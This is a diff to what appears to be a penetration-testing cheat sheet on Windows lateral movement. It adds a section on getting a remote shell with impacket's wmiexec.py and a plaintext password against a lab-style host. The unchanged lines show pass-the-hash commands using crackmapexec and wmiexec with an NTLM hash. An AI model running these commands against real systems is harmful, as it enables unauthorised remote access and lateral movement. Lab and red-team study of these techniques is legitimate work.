@@ -10,8 +10,10 @@
 * [3. Remotely Creating Services Using sc](#Remotely-Creating-Services-Using-SC)
 * [4. Creating Scheduled Tasks Remotely](#Creating-Scheduled-Tasks-Remotely)
 
-##### ➤ Windows - Pass the hash
-* [1. PTh - Passing the hash methods](#pth---pass-the-hash-methods)
+##### ➤ Windows - Gain remote shell
+* [1. Pass The Hash - Passing the hash methods](#pth---pass-the-hash-methods)
+* [2. Using valid credentials](#remote-shell-using-password)
+
 
 ##### ➤ Pivoting
 * [1. Proxychains method](#proxychains)
@@ -163,6 +165,15 @@ crackmapexec smb 10.0.0.1 -u Admin -H 32196B56FFE6F45E294117B91A83BF38 -x ipconf
 wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Admin@10.0.0.1
 ```
 
+
+``` ```
+``` ```
+## Remote shell using password
+
+##### ➤  wmiexec.py (impacket)
+```
+wmiexec.py active.htb/administrator:mysuperstrongpassword@10.10.10.1
+```
 
 
 ## Proxychains
